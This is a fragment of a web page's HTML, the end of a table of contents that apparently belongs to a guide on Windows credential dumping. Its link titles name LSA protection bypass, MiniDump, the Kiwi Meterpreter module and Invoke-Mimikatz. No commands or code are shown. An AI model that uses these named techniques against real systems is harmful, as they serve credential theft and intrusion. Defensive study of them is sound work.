toc-highlight"><strong>LSA Protection Bypass</strong></a></li><li><a href="#minidump" class="table-of-contents__link toc-highlight"><strong>MiniDump</strong></a></li><li><a href="#kiwi-meterpreter-built-in-module" class="table-of-contents__link toc-highlight"><strong>Kiwi Meterpreter Built In Module</strong></a></li><li><a href="#invoke-mimikatz" class="table-of-contents__link toc-highlight"><strong>Invoke-Mimikatz</strong></a></li></ul></div></div></div></div></main></div></div></div></div>
</body>
</html>